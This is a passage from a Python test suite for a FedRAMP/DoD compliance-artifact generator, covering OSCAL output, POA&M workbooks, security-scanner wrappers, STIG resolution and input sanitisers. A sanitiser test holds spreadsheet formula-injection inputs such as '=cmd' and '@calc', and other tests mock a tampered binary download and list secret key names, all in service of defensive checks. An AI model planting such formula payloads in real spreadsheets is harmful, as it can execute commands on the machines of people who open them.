        cm6_desc = reqs["cm-6"]["by-components"][0]["description"]
        self.assertIn("CSSP", cm6_desc)

        self.assertIn("ra-5", reqs)
        ra5_desc = reqs["ra-5"]["by-components"][0]["description"]
        self.assertIn("CSSP", ra5_desc)

        self.assertIn("si-4", reqs)
        si4_desc = reqs["si-4"]["by-components"][0]["description"]
        self.assertIn("CSSP", si4_desc)

        # Conversely, FedRAMP High must reference SCC
        fedramp_inv = {
            "system_information": {
                "system_name": "Civilian Cloud",
                "system_abbreviation": "CC",
                "impact_level": "FedRAMP High",
                "compliance_baseline": "NIST SP 800-53 Rev. 5",
            },
            "infrastructure_components": {"service_accounts": []},
            "network_architecture": {},
            "application_components": {},
        }
        fr_comps, fr_map = oscal_generator.build_oscal_components(fedramp_inv)
        fr_logging = next((c for c in fr_comps if c.get("uuid") == fr_map.get("logging_monitoring")), None)
        self.assertIn("Security Command Center", fr_logging["title"])

        fr_ctrl_impl = oscal_generator.build_oscal_control_implementations(fedramp_inv, fr_map)
        fr_reqs = {r["control-id"]: r for r in fr_ctrl_impl.get("implemented-requirements", [])}
        self.assertIn("Security Command Center (SCC) Premium", fr_reqs["cm-6"]["by-components"][0]["description"])

    def test_excel_hydrator_auto_cleanup_descriptor_lifecycle(self) -> None:
        """Tests that BaseExcelHydrator subclasses automatically release openpyxl file handles on success and failure."""
        import tempfile
        import openpyxl

        with tempfile.TemporaryDirectory() as tmp_dir:
            dummy_tpl = os.path.join(tmp_dir, "dummy.xlsm")
            out_xl = os.path.join(tmp_dir, "out.xlsm")
            wb = openpyxl.Workbook()
            wb.save(dummy_tpl)
            wb.close()

            # Test subclass with intentional failure
            test_case = self
            class FaultyHydrator(excel_hydrator.BaseExcelHydrator):
                def hydrate(self, inventory: Dict[str, Any], output_path: str) -> str:
                    wb_inst = self.load_workbook()
                    test_case.assertIsNotNone(self._current_wb)
                    raise RuntimeError("Simulated failure during hydration")

            hydrator = FaultyHydrator(dummy_tpl)
            with self.assertRaises(RuntimeError):
                hydrator.hydrate({}, out_xl)
            # Descriptor must be closed and reset
            self.assertIsNone(hydrator._current_wb)

    def test_exporter_strategies_boundary_confinement(self) -> None:
        """Tests that Policy and Data Exporter strategies strictly confine file writes to allowed_boundary."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmp_dir:
            boundary_dir = os.path.join(tmp_dir, "safe_boundary")
            os.makedirs(boundary_dir, exist_ok=True)
            outside_path = os.path.join(tmp_dir, "outside.md")

            md_exporter = export_strategies.MarkdownPolicyExporter()
            with self.assertRaises(PermissionError):
                md_exporter.export_document("# Content", outside_path, {}, allowed_boundary=boundary_dir)

            docx_exporter = export_strategies.DocxPolicyExporter()
            with self.assertRaises(PermissionError):
                docx_exporter.export_document("# Content", outside_path, {}, allowed_boundary=boundary_dir)

    def test_cloud_run_container_image_placeholder_modernization(self) -> None:
        """Tests that Cloud Run container fallback uses modern pkg.dev and not deprecated gcr.io."""
        tf_data: Dict[str, Any] = {
            "all_resources": [],
            "cloud_run_services": [],
        }
        extract_system_data.classify_and_ingest_resource(
            "google_cloud_run_service",
            "app-svc",
            {"name": "app-svc", "location": "us-central1"},
            "main.tf",
            tf_data,
        )
        self.assertEqual(len(tf_data["cloud_run_services"]), 1)
        svc = tf_data["cloud_run_services"][0]
        self.assertEqual(svc["image"], "us-docker.pkg.dev/cloudrun/container/workload:latest")
        self.assertNotIn("gcr.io", svc["image"])

    def test_validate_compliance_package_preflight_drift_ordering(self) -> None:
        """Tests that validate_compliance_package executes drift auto-repair before file and token inspection."""
        import tempfile
        from unittest.mock import patch, MagicMock
        with tempfile.TemporaryDirectory() as tmp_dir:
            ato_dir = os.path.join(tmp_dir, "ato_artifacts")
            os.makedirs(ato_dir, exist_ok=True)
            inv_path = os.path.join(tmp_dir, "system_inventory.json")
            file_helpers.write_text_file(inv_path, '{"system_information": {"name": "Test"}}')

            call_order = []

            def mock_run(*args, **kwargs):
                call_order.append("drift_repair")
                return MagicMock(returncode=0)

            def mock_inspect(*args, **kwargs):
                call_order.append("inspect_files")
                return []

            with patch("subprocess.run", side_effect=mock_run):
                with patch("validate_compliance_artifacts.audit_excel_workbooks", side_effect=mock_inspect):
                    with patch("validate_compliance_artifacts.audit_docx_policies", return_value=[]):
                        with patch("validate_compliance_artifacts.audit_oscal_packages", return_value=[]):
                            with patch("validate_compliance_artifacts.evaluate_disa_stig_applicability", return_value=[]):
                                validate_compliance_artifacts.validate_compliance_package(tmp_dir, fix_drift=True)

            self.assertIn("drift_repair", call_order)
            self.assertIn("inspect_files", call_order)
            self.assertLess(
                call_order.index("drift_repair"),
                call_order.index("inspect_files"),
                "Drift repair must execute before workbook and artifact inspection",
            )

    def test_security_scanner_bridge_error_and_timeout_reporting(self) -> None:
        """Verifies scanner failures and timeouts produce high-severity POA&M findings instead of empty lists."""
        import security_scanner_bridge
        from unittest.mock import patch, MagicMock
        import subprocess

        # 1. Test Checkov non-zero error exit code (e.g. 2)
        mock_err_proc = MagicMock()
        mock_err_proc.returncode = 2
        mock_err_proc.args = []
        
        def mock_checkov_err_runner(cmd_args, **kwargs):
            kwargs["stderr"].write("Fatal Checkov crash: Out of memory")
            kwargs["stderr"].flush()
            mock_err_proc.args = cmd_args
            return MagicMock(__enter__=MagicMock(return_value=mock_err_proc))

        with patch("shutil.which", return_value="/usr/local/bin/checkov"):
            with patch("os.path.isdir", return_value=True):
                with patch("os.walk", return_value=[("/mock", [], ["main.tf"])]):
                    findings = security_scanner_bridge.run_checkov_scan("/mock", runner=mock_checkov_err_runner)
                    self.assertEqual(len(findings), 1)
                    self.assertEqual(findings[0]["check_id"], "CKV_SCANNER_ERROR")
                    self.assertEqual(findings[0]["severity"], "High")

        # 2. Test Checkov timeout
        def mock_checkov_timeout_runner(cmd_args, **kwargs):
            mock_proc = MagicMock()
            mock_proc.args = cmd_args
            mock_proc.wait = MagicMock(side_effect=subprocess.TimeoutExpired(cmd=["checkov"], timeout=60))
            return MagicMock(__enter__=MagicMock(return_value=mock_proc))

        with patch("shutil.which", return_value="/usr/local/bin/checkov"):
            with patch("os.path.isdir", return_value=True):
                with patch("os.walk", return_value=[("/mock", [], ["main.tf"])]):
                    findings = security_scanner_bridge.run_checkov_scan("/mock", timeout_seconds=60, runner=mock_checkov_timeout_runner)
                    self.assertEqual(len(findings), 1)
                    self.assertEqual(findings[0]["check_id"], "CKV_SCANNER_TIMEOUT")
                    self.assertEqual(findings[0]["severity"], "High")

        # 3. Test Semgrep non-zero error exit code
        mock_sem_proc = MagicMock()
        mock_sem_proc.returncode = 2
        mock_sem_proc.args = []
        
        def mock_semgrep_err_runner(cmd_args, **kwargs):
            kwargs["stderr"].write("Semgrep engine fatal syntax error")
            kwargs["stderr"].flush()
            mock_sem_proc.args = cmd_args
            return MagicMock(__enter__=MagicMock(return_value=mock_sem_proc))

        with patch("shutil.which", return_value="/usr/local/bin/semgrep"):
            with patch("os.path.isdir", return_value=True):
                findings = security_scanner_bridge.run_semgrep_scan("/mock", runner=mock_semgrep_err_runner)
                self.assertEqual(len(findings), 1)
                self.assertEqual(findings[0]["check_id"], "SEMGREP_SCANNER_ERROR")
                self.assertEqual(findings[0]["severity"], "High")

        # 4. Test Semgrep timeout
        def mock_semgrep_timeout_runner(cmd_args, **kwargs):
            mock_proc = MagicMock()
            mock_proc.args = cmd_args
            mock_proc.wait = MagicMock(side_effect=subprocess.TimeoutExpired(cmd=["semgrep"], timeout=120))
            return MagicMock(__enter__=MagicMock(return_value=mock_proc))

        with patch("shutil.which", return_value="/usr/local/bin/semgrep"):
            with patch("os.path.isdir", return_value=True):
                findings = security_scanner_bridge.run_semgrep_scan("/mock", timeout_seconds=120, runner=mock_semgrep_timeout_runner)
                self.assertEqual(len(findings), 1)
                self.assertEqual(findings[0]["check_id"], "SEMGREP_SCANNER_TIMEOUT")
                self.assertEqual(findings[0]["severity"], "High")

        # 4. Test mapping of scanner error to CA-02 / RA-05
        ctl_id, ctl_title = security_scanner_bridge.map_checkov_to_nist("CKV_SCANNER_ERROR", "Checkov crash")
        self.assertIn("CA-02", ctl_id)
        self.assertIn("RA-05", ctl_id)

    def test_semgrep_isolated_tempfile_home(self) -> None:
        """Verifies run_semgrep_scan isolates HOME in a temporary directory and adds --disable-version-check."""
        import security_scanner_bridge
        from unittest.mock import patch, MagicMock

        captured_env = {}
        captured_cmd = []

        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.args = []

        def mock_runner(cmd, *args, **kwargs):
            nonlocal captured_cmd, captured_env
            captured_cmd = cmd
            captured_env = kwargs.get("env", {})
            kwargs["stdout"].write('{"results": []}')
            kwargs["stdout"].flush()
            mock_proc.args = cmd
            return MagicMock(__enter__=MagicMock(return_value=mock_proc))

        with patch("shutil.which", return_value="/usr/local/bin/semgrep"):
            with patch("os.path.isdir", return_value=True):
                security_scanner_bridge.run_semgrep_scan("/mock/read_only_dir", runner=mock_runner)

        self.assertIn("--disable-version-check", captured_cmd)
        self.assertIn("HOME", captured_env)
        self.assertNotEqual(captured_env["HOME"], "/mock/read_only_dir")
        self.assertIn("semgrep_home_", captured_env["HOME"])

    def test_poam_zero_findings_parity_yaml_and_excel(self) -> None:
        """Verifies strict parity between YAML and Excel when zero POA&M findings exist."""
        clean_inventory = copy.deepcopy(self.mock_inventory)
        clean_inventory["system_information"]["system_name"] = "Flawless System"
        clean_inventory["system_information"]["system_abbreviation"] = "FLW"
        # Ensure no open poam gaps
        clean_inventory["infrastructure_components"]["iam_bindings"] = []
        clean_inventory["infrastructure_components"]["storage_buckets"] = [{"name": "mock-compliance-bucket", "cmek_encrypted": True, "versioning": True, "uniform_bucket_level_access": True}]
        clean_inventory["infrastructure_components"]["kms_keys"] = [{"name": "key1", "rotation_period": "7776000s", "protection_level": "HSM"}]
        clean_inventory["infrastructure_components"]["databases"] = []
        clean_inventory["infrastructure_components"]["compute_instances"] = []
        clean_inventory["infrastructure_components"]["gke_clusters"] = []
        clean_inventory["network_architecture"]["firewall_rules"] = [{"direction": "INGRESS", "source_ranges": ["10.0.0.0/8"]}]

        # YAML POA&M
        poam_yaml = generate_compliance_artifacts.generate_poam_matrix_yaml(clean_inventory, eff_date="2026-10-01")
        self.assertIn("total_open_items: 0", poam_yaml)
        self.assertIn("poam_items:\n  []", poam_yaml)

        # Excel POA&M
        tpl_path = os.path.join(TEMPLATES_DIR, "poam", "POAM_Export_Template.xlsm")
        out_path = os.path.join(self.test_dir, "Clean_POAM.xlsm")
        hydrator = excel_hydrator.POAMHydrator(tpl_path)
        hydrator.hydrate(clean_inventory, out_path)

        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        ws = workbook["POA&M"]
        # Row 8 col 1 should be None (no synthetic POAM-001 row injected)
        self.assertIsNone(ws.cell(row=8, column=1).value)
        self.assertIsNone(ws.cell(row=8, column=2).value)

    def test_oscal_gcp_foundations_fabric_alignment(self) -> None:
        """Verifies that OSCAL generator generates authoritative GCP Foundations Fabric components and control implementations."""
        import oscal_generator
        gcp_inventory = {
            "system_information": {
                "system_name": "GCP Mission System",
                "system_abbreviation": "GMS",
                "cloud_provider": "Google Cloud Platform (GCP)",
                "cloud_service_provider_abbr": "GCP",
                "impact_level": "FedRAMP High",
                "compliance_baseline": "NIST SP 800-53 Rev. 5",
            },
            "infrastructure_components": {
                "service_accounts": [{"account_id": "sa-app", "email": "sa-app@proj.iam.gserviceaccount.com"}],
                "kms_keys": [{"name": "cmek-key-01", "location": "us-central1", "protection_level": "HSM"}],
                "storage_buckets": [{"name": "gcs-mission-data", "location": "us-central1"}],
            },
            "network_architecture": {
                "networks": ["vpc-foundations-hub"],
                "subnets": ["subnet-workload"],
                "firewall_rules": [{"name": "allow-iap", "action": "allow", "direction": "INGRESS"}],
            },
            "application_components": {},
        }

        comps, comp_map = oscal_generator.build_oscal_components(gcp_inventory)
        comp_titles = [c["title"] for c in comps]
        self.assertTrue(any("Identity & Access Management" in t for t in comp_titles))
        self.assertTrue(any("Virtual Private Cloud" in t for t in comp_titles))
        self.assertTrue(any("Customer-Managed Encryption Keys" in t for t in comp_titles))
        self.assertTrue(any("Cloud Storage" in t for t in comp_titles))

        ctrl_impl = oscal_generator.build_oscal_control_implementations(gcp_inventory, comp_map)
        reqs = {r["control-id"]: r for r in ctrl_impl.get("implemented-requirements", [])}

        ac2_desc = reqs["ac-2"]["by-components"][0]["description"]
        self.assertIn("Google Cloud IAM", ac2_desc)
        self.assertIn("service accounts", ac2_desc)

        ac4_desc = reqs["ac-4"]["by-components"][0]["description"]
        self.assertIn("Andromeda SDN", ac4_desc)
        self.assertIn("Private Google Access", ac4_desc)

        # Evidence-based gating for sc-7, sc-12, sc-28
        self.assertEqual(reqs["sc-7"]["by-components"][0]["implementation-status"]["state"], "implemented")
        self.assertEqual(reqs["sc-12"]["by-components"][0]["implementation-status"]["state"], "implemented")
        self.assertEqual(reqs["sc-28"]["by-components"][0]["implementation-status"]["state"], "implemented")

    def test_config_precedence_determinism(self) -> None:
        """Verifies deterministic configuration precedence in load_all_system_configs."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            p_comp = os.path.join(tmp_dir, "compliance_config.yaml")
            p_sys = os.path.join(tmp_dir, "system_config.yaml")
            p_found = os.path.join(tmp_dir, "foundation_variables.yaml")
            p_vars = os.path.join(tmp_dir, "variables.yaml")
            p_ex = os.path.join(tmp_dir, "compliance_config.yaml.example")

            file_helpers.write_text_file(p_ex, "system_information:\n  system_name: 'Example Name'\n")
            file_helpers.write_text_file(p_vars, "system_information:\n  system_name: 'Vars Name'\n")
            file_helpers.write_text_file(p_found, "system_information:\n  system_name: 'Foundation Name'\n")
            file_helpers.write_text_file(p_sys, "system_information:\n  system_name: 'System Name'\n")
            file_helpers.write_text_file(p_comp, "system_information:\n  system_name: 'Compliance Name'\n")

            cfg = extract_system_data.load_all_system_configs(tmp_dir)
            # compliance_config.yaml has highest precedence (100) and must win
            self.assertEqual(cfg["system_information"]["system_name"], "Compliance Name")

            # Remove compliance_config.yaml, system_config.yaml (90) must win
            os.remove(p_comp)
            cfg2 = extract_system_data.load_all_system_configs(tmp_dir)
            self.assertEqual(cfg2["system_information"]["system_name"], "System Name")

            # Remove system_config.yaml, foundation_variables.yaml (70) must win
            os.remove(p_sys)
            cfg3 = extract_system_data.load_all_system_configs(tmp_dir)
            self.assertEqual(cfg3["system_information"]["system_name"], "Foundation Name")

            # Remove foundation_variables.yaml, variables.yaml (50) must win
            os.remove(p_found)
            cfg4 = extract_system_data.load_all_system_configs(tmp_dir)
            self.assertEqual(cfg4["system_information"]["system_name"], "Vars Name")

    def test_clean_cell_value_idempotency(self) -> None:
        """Verifies clean_cell_value is idempotent and prevents accumulating escape quotes."""
        # Sanitizes formula injection
        self.assertEqual(file_helpers.clean_cell_value("=cmd"), "'=cmd")
        self.assertEqual(file_helpers.clean_cell_value("@calc"), "'@calc")
        self.assertEqual(file_helpers.clean_cell_value("+1234"), "+1234")
        self.assertEqual(file_helpers.clean_cell_value("+bad_formula"), "'+bad_formula")

        # Idempotency: re-running on already-quoted strings must NOT prepend another quote
        self.assertEqual(file_helpers.clean_cell_value("'=cmd"), "'=cmd")
        self.assertEqual(file_helpers.clean_cell_value("'@calc"), "'@calc")
        self.assertEqual(file_helpers.clean_cell_value("'+bad_formula"), "'+bad_formula")
        self.assertEqual(file_helpers.clean_cell_value("'-bad_formula"), "'-bad_formula")

    def test_shared_software_and_container_sanitizers(self) -> None:
        """Verifies shared container tag and software package sanitizers."""
        img, ver = file_helpers.sanitize_container_image_tag("${var.repo}/app:${var.tag}")
        self.assertEqual(img, "latest/app:latest")
        self.assertEqual(ver, "latest")

        img2, ver2 = file_helpers.sanitize_container_image_tag("nginx:1.25.4")
        self.assertEqual(img2, "nginx:1.25.4")
        self.assertEqual(ver2, "1.25.4")

        pkg, pkg_ver = file_helpers.sanitize_software_package_identity("${var.pkg_name}", "${var.pkg_ver}")
        self.assertEqual(pkg, "unknown-package")
        self.assertEqual(pkg_ver, "Latest")

        pkg2, pkg_ver2 = file_helpers.sanitize_software_package_identity("fastapi", "0.110.0")
        self.assertEqual(pkg2, "fastapi")
        self.assertEqual(pkg_ver2, "0.110.0")

    def test_validate_drift_sync_forwards_format_flags(self) -> None:
        """Verifies validate_compliance_package forwards export formats to generate_compliance_artifacts during --fix."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            ato_dir = os.path.join(tmp_dir, "ato_artifacts")
            os.makedirs(ato_dir, exist_ok=True)
            inv_path = os.path.join(tmp_dir, "system_inventory.json")
            file_helpers.write_text_file(inv_path, '{"system_information": {"name": "Test"}}')

            captured_cmd = []

            def mock_run(cmd, *args, **kwargs):
                nonlocal captured_cmd
                captured_cmd = cmd
                return unittest.mock.MagicMock(returncode=0)

            with unittest.mock.patch("subprocess.run", side_effect=mock_run):
                with unittest.mock.patch("validate_compliance_artifacts.audit_excel_workbooks", return_value=[]):
                    with unittest.mock.patch("validate_compliance_artifacts.audit_docx_policies", return_value=[]):
                        with unittest.mock.patch("validate_compliance_artifacts.audit_oscal_packages", return_value=[]):
                            with unittest.mock.patch("validate_compliance_artifacts.evaluate_disa_stig_applicability", return_value=[]):
                                validate_compliance_artifacts.validate_compliance_package(
                                    tmp_dir,
                                    fix_drift=True,
                                    policy_format="markdown",
                                    data_format="yaml",
                                    oscal_format="json",
                                    oscal_version="1.2.3",
                                )

            self.assertIn("--policy-format=markdown", captured_cmd)
            self.assertIn("--data-format=yaml", captured_cmd)
            self.assertIn("--oscal-format=json", captured_cmd)
            self.assertIn("--oscal-version=1.2.3", captured_cmd)

    def test_scanner_timeouts_default_and_config(self) -> None:
        """Verifies Checkov and Semgrep enforce 300s timeout by default and forward custom timeouts."""
        import security_scanner_bridge as ssb
        from unittest.mock import MagicMock

        mock_proc_checkov = MagicMock()
        mock_proc_checkov.returncode = 0
        mock_proc_checkov.args = []
        
        def mock_checkov_runner(cmd_args, **kwargs):
            mock_proc_checkov.args = cmd_args
            return MagicMock(__enter__=MagicMock(return_value=mock_proc_checkov))

        with unittest.mock.patch("shutil.which", return_value="/usr/local/bin/checkov"):
            with unittest.mock.patch("os.path.isdir", return_value=True):
                ssb.run_checkov_scan("/mock/dir", runner=mock_checkov_runner)
                self.assertEqual(mock_proc_checkov.wait.call_args[1]["timeout"], 300)

        mock_proc_semgrep = MagicMock()
        mock_proc_semgrep.returncode = 0
        mock_proc_semgrep.args = []
        
        def mock_semgrep_runner(cmd_args, **kwargs):
            # Write a valid JSON object to stdout so it doesn't fail parsing if it tries
            kwargs["stdout"].write('{"results": []}')
            kwargs["stdout"].flush()
            mock_proc_semgrep.args = cmd_args
            return MagicMock(__enter__=MagicMock(return_value=mock_proc_semgrep))

        with unittest.mock.patch("shutil.which", return_value="/usr/local/bin/semgrep"):
            with unittest.mock.patch("os.path.isdir", return_value=True):
                ssb.run_semgrep_scan("/mock/dir", runner=mock_semgrep_runner)
                self.assertEqual(mock_proc_semgrep.wait.call_args[1]["timeout"], 300)


    def test_dynamic_scanner_bootstrap_integrity(self) -> None:
        """Verifies bootstrap_scanner_binary checks cryptographic SHA-256 and detects mismatches."""
        import security_scanner_bridge as ssb

        # 1. Existing binary returns path directly
        with unittest.mock.patch("shutil.which", return_value="/opt/tools/trivy"):
            res = ssb.bootstrap_scanner_binary("trivy")
            self.assertEqual(res, "/opt/tools/trivy")

        # 2. Unsupported tool returns None
        res_unknown = ssb.bootstrap_scanner_binary("unknown_tool_xyz")
        self.assertIsNone(res_unknown)

        # 3. Checksum mismatch triggers security violation and aborts
        with tempfile.TemporaryDirectory() as tmp_dir:
            with unittest.mock.patch("shutil.which", return_value=None):
                with unittest.mock.patch("platform.system", return_value="Linux"):
                    with unittest.mock.patch("platform.machine", return_value="x86_64"):
                        mock_resp = unittest.mock.MagicMock()
                        mock_resp.read.return_value = b"corrupted_or_malicious_binary_payload"
                        mock_resp.__enter__.return_value = mock_resp
                        with unittest.mock.patch("urllib.request.urlopen", return_value=mock_resp):
                            res_mismatch = ssb.bootstrap_scanner_binary("trivy", cache_dir=tmp_dir)
                            self.assertIsNone(res_mismatch)

    def test_live_cloud_telemetry_connectors(self) -> None:
        """Verifies live Google SCC telemetry connector parses findings and degrades gracefully."""
        import security_scanner_bridge as ssb

        # 1. Google SCC: graceful skip if unconfigured
        self.assertEqual(ssb.fetch_live_scc_findings(None), [])
        self.assertEqual(ssb.fetch_live_scc_findings("[CONFIG_REQUIRED: Project ID]"), [])

        # 2. Google SCC: skips polling in DoD IL4/IL5/IL6 environments
        self.assertEqual(ssb.fetch_live_scc_findings("test-project-123", impact_level="IL5"), [])
        self.assertEqual(ssb.fetch_live_scc_findings("test-project-123", impact_level="DOD_IL4"), [])

        # 3. Google SCC: mock gcloud output
        mock_scc_json = json.dumps([
            {
                "finding": {
                    "category": "PUBLIC_BUCKET_ACL",
                    "description": "Storage bucket has public ACL configured.",
                    "resourceName": "//storage.googleapis.com/test-bucket",
                    "severity": "HIGH",
                }
            }
        ])
        mock_proc = unittest.mock.MagicMock()
        mock_proc.returncode = 0
        mock_proc.args = []
        
        def mock_scc_runner(cmd_args, **kwargs):
            kwargs["stdout"].write(mock_scc_json)
            kwargs["stdout"].flush()
            mock_proc.args = cmd_args
            return unittest.mock.MagicMock(__enter__=unittest.mock.MagicMock(return_value=mock_proc))

        with unittest.mock.patch("shutil.which", return_value="/usr/local/bin/gcloud"):
            scc_findings = ssb.fetch_live_scc_findings("test-project-123", runner=mock_scc_runner)
            self.assertEqual(len(scc_findings), 1)
            self.assertEqual(scc_findings[0]["check_id"], "SCC_PUBLIC_BUCKET_ACL")
            self.assertEqual(scc_findings[0]["severity"], "High")
            self.assertIn("Live Cloud Telemetry (Google SCC v1)", scc_findings[0]["source"])

        # 4. Google SCC: mock gcloud API error
        def mock_scc_err_runner(cmd_args, **kwargs):
            import subprocess
            raise subprocess.SubprocessError("API Error 403: Forbidden")

        with unittest.mock.patch("shutil.which", return_value="/usr/local/bin/gcloud"):
            err_findings = ssb.fetch_live_scc_findings("test-project-123", runner=mock_scc_err_runner)
            self.assertEqual(len(err_findings), 1)
            self.assertEqual(err_findings[0]["check_id"], "SCC_QUERY_FAILURE")

    def test_parse_tfvars_content_strict_mode(self) -> None:
        """Verifies parse_tfvars_content raises ValueError on invalid HCL syntax in strict mode."""
        malformed_hcl = 'invalid = = = = syntax error'
        # Strict mode must fail loudly
        with self.assertRaises(ValueError):
            extract_system_data.parse_tfvars_content(malformed_hcl, strict=True)

        # Non-strict mode degrades safely
        res = extract_system_data.parse_tfvars_content(malformed_hcl, strict=False)
        self.assertIsInstance(res, dict)

    def test_dynamic_stig_resolver_and_active_version_management(self) -> None:
        """Tests dynamic DISA STIG version resolver, cache, overrides, and air-gap resilience."""
        # 1. Baseline catalog loading and slug alias normalization
        resolver = stig_resolver.StigResolver(target_dir=self.test_dir)
        self.assertGreater(len(resolver.get_all_catalog_stigs()), 20)

        # Canonical vs alias lookup
        entry1 = resolver.get_stig_entry("canonical_ubuntu_22.04_lts")
        entry2 = resolver.get_stig_entry("canonical_ubuntu_2204_lts")
        self.assertIsNotNone(entry1)
        self.assertEqual(entry1["slug"], "canonical_ubuntu_2204_lts")
        self.assertEqual(entry1, entry2)

        # 2. Multi-tier resolution: Baseline catalog version
        ver, src = resolver.resolve_version("kubernetes")
        self.assertEqual(ver, "v1R12")
        self.assertEqual(src, "Authoritative Baseline")

        # 3. User override takes highest precedence
        custom_config = {
            "disa_stigs": {
                "version_overrides": {
                    "kubernetes": "v1R15",
                    "canonical_ubuntu_22.04_lts": "v2R9",
                },
                "custom_checklists": [
                    {
                        "title": "DISA Custom Mission Boundary STIG",
                        "slug": "custom_mission_boundary",
                        "version": "v1R1",
                        "category": "Perimeter Security",
                        "scope": "Custom enclave boundary.",
                        "action": "Complete custom CKL in STIG Viewer.",
                    }
                ],
            }
        }
        override_resolver = stig_resolver.StigResolver(
            target_dir=self.test_dir,
            config=custom_config,
        )
        ver_k8s, src_k8s = override_resolver.resolve_version("kubernetes")
        self.assertEqual(ver_k8s, "v1R15")
        self.assertIn("User Override", src_k8s)

        ver_u22, src_u22 = override_resolver.resolve_version("canonical_ubuntu_2204_lts")
        self.assertEqual(ver_u22, "v2R9")
        self.assertIn("User Override", src_u22)

        # 4. Custom checklist injection
        test_inv = {"infrastructure_components": {}, "network_architecture": {}}
        applicable = override_resolver.evaluate_applicable_stigs(test_inv)
        custom_found = [s for s in applicable if s["slug"] == "custom_mission_boundary"]
        self.assertEqual(len(custom_found), 1)
        self.assertEqual(custom_found[0]["status"], "Custom Enclave Requirement")
        self.assertEqual(custom_found[0]["version"], "v1R1")

        # 5. Remote pulling simulation with cache persistence
        remote_feed_json = {
            "stigs": {
                "postgresql_13": {"version": "v2R5"},
                "cisco_ios_xe_router": {"version": "v2R7"},
            }
        }
        mock_resp = unittest.mock.MagicMock()
        mock_resp.status = 200
        mock_resp.read.return_value = json.dumps(remote_feed_json).encode("utf-8")
        mock_resp.__enter__.return_value = mock_resp

        mock_opener = unittest.mock.MagicMock(return_value=mock_resp)
        pull_res = resolver.pull_active_versions(source="https://cyber.mil/stigs.json", url_opener=mock_opener)
        self.assertTrue(pull_res["success"])
        self.assertEqual(pull_res["updated_count"], 2)

        # Check local cache was saved
        cache_file = os.path.join(self.test_dir, "ato_artifacts", ".stig_cache.json")
        self.assertTrue(os.path.isfile(cache_file))

        # Verify resolution reflects pulled version
        ver_pg, src_pg = resolver.resolve_version("postgresql_13")
        self.assertEqual(ver_pg, "v2R5")
        self.assertIn("Live Active", src_pg)

        # 6. Cached active resolution in a new resolver instance
        cached_resolver = stig_resolver.StigResolver(target_dir=self.test_dir)
        ver_pg_cached, src_pg_cached = cached_resolver.resolve_version("postgresql_13")
        self.assertEqual(ver_pg_cached, "v2R5")
        self.assertIn("Cached Active", src_pg_cached)

        # 7. Air-gapped / offline network resilience
        mock_err_opener = unittest.mock.MagicMock(side_effect=urllib.error.URLError("No route to host"))
        offline_res = resolver.pull_active_versions(source="https://unreachable.disa.mil/stigs.json", url_opener=mock_err_opener)
        self.assertFalse(offline_res["success"])
        self.assertIn("unreachable", offline_res["message"].lower())
        # Resolver falls back safely to catalog baseline without error
        ver_redis, src_redis = resolver.resolve_version("database_srg")
        self.assertEqual(ver_redis, "v3R4")

        # 8. Schema validation in file_helpers
        valid_cfg = {"disa_stigs": {"update_mode": "auto", "version_overrides": {"kubernetes": "v1R12"}}}
        file_helpers.validate_compliance_config_schema(valid_cfg)

        invalid_cfg = {"disa_stigs": "not-a-dict"}
        with self.assertRaises(ValueError):
            file_helpers.validate_compliance_config_schema(invalid_cfg)

        invalid_checklists = {"disa_stigs": {"custom_checklists": "not-a-list"}}
        with self.assertRaises(ValueError):
            file_helpers.validate_compliance_config_schema(invalid_checklists)

    def test_poc_name_formatting_and_military_rank_handling(self) -> None:
        """Tests that format_poc_name_with_comma distinguishes military ranks and titles from names."""
        test_cases = [
            ("Jane Doe", "Doe, Jane"),
            ("Jane A. Doe", "Doe, Jane A."),
            ("Jane Doe Jr.", "Doe Jr., Jane"),
            ("Major Jane Doe", "Doe, Major Jane"),
            ("Maj. Jane Doe", "Doe, Maj. Jane"),
            ("MAJ Jane Doe", "Doe, MAJ Jane"),
            ("Major General Jane Doe", "Doe, Major General Jane"),
            ("Lieutenant Colonel John A. Smith Jr.", "Smith Jr., Lieutenant Colonel John A."),
            ("Dr. Alice Johnson", "Johnson, Dr. Alice"),
            ("Doe, Jane", "Doe, Jane"),
            ("Doe, Major Jane", "Doe, Major Jane"),
            ("Jane Doe, Major", "Doe, Major Jane"),
            ("[CONFIG_REQUIRED: ISSO Name]", "[CONFIG_REQUIRED: ISSO Name]"),
            ("", ""),
            (None, None),
        ]
        for inp, expected in test_cases:
            actual = excel_hydrator.format_poc_name_with_comma(inp)
            self.assertEqual(
                actual,
                expected,
                f"Failed for input '{inp}': expected '{expected}', got '{actual}'",
            )

    def test_security_remediations_and_traversal_robustness(self) -> None:
        """Tests fixes for directory traversal, command injection, sensitive scrubber, and ReDoS."""
        # 1. Test Sensitive Key Scrubber with pwd, passphrase, and auth_string
        test_keys_sensitive = [
            "db_admin_pwd",
            "root_pwd",
            "user_passphrase",
            "app_auth_string",
            "_auth_string",
            "signing_key",
            "session_key",
            "bearer_token",
            "passcode",
        ]
        for sk in test_keys_sensitive:
            self.assertTrue(
                file_helpers.is_sensitive_key(sk),
                f"Key '{sk}' should be detected as sensitive"
            )

        scrubbed = file_helpers.scrub_sensitive_data({
            "db_admin_pwd": "super_secret_password_123",
            "user_passphrase": "do_not_leak_passphrase",
            "auth_string": "bearer 987654321",
            "normal_setting": "safe_value",
        })
        self.assertEqual(scrubbed["db_admin_pwd"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["user_passphrase"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["auth_string"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["normal_setting"], "safe_value")

        # 2. Test HCL ReDoS Resilience in extract_hcl_attr
        large_nested_block = (
            'resource "google_compute_instance" "vm" {\n'
            '  name = "test-vm"\n'
            '  nested_config = {\n'
            + ('    unmatched_attr = "some_data"\n' * 100)
            + '    target_child = "success_val"\n'
            '  }\n'
            '}\n'
        )
        val = extract_system_data.extract_hcl_attr(large_nested_block, "nested_config.target_child")
        self.assertEqual(val, "success_val")

        # 3. Test Trivy command includes '--' argument separator before path
        with unittest.mock.patch("shutil.which", return_value="/usr/local/bin/trivy"):
            mock_proc = unittest.mock.MagicMock()
            mock_proc.returncode = 0
            mock_proc.args = []
            
            def mock_trivy_runner(cmd_args, **kwargs):
                kwargs["stdout"].write("{}")
                kwargs["stdout"].flush()
